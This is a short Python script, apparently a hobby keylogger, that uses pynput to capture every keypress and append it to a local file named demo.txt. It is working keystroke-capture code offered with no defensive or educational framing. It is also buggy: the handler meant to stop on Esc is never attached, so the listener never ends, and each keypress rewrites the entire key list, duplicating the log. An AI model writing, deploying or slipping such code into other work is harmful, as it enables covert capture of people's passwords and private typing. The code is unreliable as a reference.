from pynput.keyboard import Key, Listener

k=[]


def on_press(key):
    k.append(key)
    write_1(k)
    print(key)

def write_1(asd):
    with open("demo.txt","a") as f:
        for i in asd:
            new_asd=str(i).replace("'",'')
            f.write(new_asd)
            f.write(" ")

def on_relaese(key):
    if key==Key.esc:
        return False

with Listener(on_press=on_press) as l:
    l.join()
